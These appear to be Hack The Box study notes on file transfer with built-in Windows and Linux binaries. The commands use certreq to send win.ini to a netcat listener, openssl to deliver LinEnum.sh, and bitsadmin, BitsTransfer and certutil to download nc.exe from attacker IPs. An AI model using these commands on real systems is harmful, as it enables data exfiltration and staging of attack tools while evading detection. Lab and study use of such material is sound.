- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

## Windows CertReq.exe 
RHOST:
```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
LHOST:
```shell-session
Tachipy@htb[/htb]$ sudo nc -lvnp 80
```


## Linux openssl:

LHOST create ssl cert:
```shell-session
Tachipy@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
LHOST:
```shell-session
Tachipy@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

RHOST:
```shell-session
Tachipy@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Bitsadmin
#### File Download with Bitsadmin

  File Download with Bitsadmin

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

Download

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---



#### Download a File with Certutil

  Download a File with Certutil

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
